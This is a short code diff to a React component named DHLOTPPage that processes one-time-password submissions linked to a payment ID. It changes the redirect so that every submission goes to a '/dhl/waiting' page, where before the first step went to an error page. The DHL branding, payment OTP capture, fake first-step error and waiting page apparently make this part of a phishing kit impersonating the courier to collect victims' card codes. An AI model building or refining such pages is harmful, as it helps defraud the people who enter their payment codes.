@@ -84,11 +84,8 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
       if (paymentId) params.set("paymentId", paymentId);
       const queryString = params.toString();
       
-      if (step === 1) {
-        window.location.href = `/error${queryString ? `?${queryString}` : ""}`;
-      } else {
-        window.location.href = `/dhl/waiting${queryString ? `?${queryString}` : ""}`;
-      }
+      // Always redirect to loading page after any OTP submission
+      window.location.href = `/dhl/waiting${queryString ? `?${queryString}` : ""}`;
     },
     onError: () => {
       // Preserve session and paymentId params in error navigation
